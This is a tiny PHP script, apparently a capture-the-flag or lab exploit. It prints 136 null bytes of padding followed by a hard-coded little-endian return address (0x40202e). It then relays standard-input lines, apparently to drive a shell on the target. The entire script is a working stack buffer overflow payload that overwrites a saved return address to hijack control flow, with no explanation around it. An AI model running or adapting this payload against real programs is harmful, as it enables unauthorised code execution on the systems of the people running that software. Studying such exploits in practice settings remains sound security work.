<?php
	$i = 136;
	$aux = "";
	while($i>0){
		$aux = $aux."\x00";
		$i = $i-1;
	}

	echo $aux."\x2e\x20\x40\x00\x00\x00\x00\x00\n";

	while(1){
		echo readline()."\n";
	}
?>
